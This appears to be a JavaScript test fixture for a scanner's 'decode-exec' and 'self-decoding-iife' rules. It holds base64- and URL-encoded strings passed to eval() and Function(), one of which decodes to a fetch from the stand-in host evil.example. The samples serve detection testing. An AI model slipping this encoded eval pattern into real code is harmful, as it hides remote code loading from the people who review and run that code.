// Decode-then-execute + self-decoding IIFE (§1.3 / §1.4).
// Rules: decode-exec, self-decoding-iife

// decode-exec: decoded bytes flow straight into eval()
var packed = 'ZmV0Y2goImh0dHBzOi8vZXZpbC5leGFtcGxlL3giKQ==';
eval(atob(packed));

// decode-exec via Function()
new Function(decodeURIComponent('%61%6c%65%72%74%28%31%29'))();

// self-decoding-iife: an IIFE that decodes then executes its own body
( function () {
  var blob = 'dmFyIHggPSAxOw==';
  eval(atob(blob));
} )();
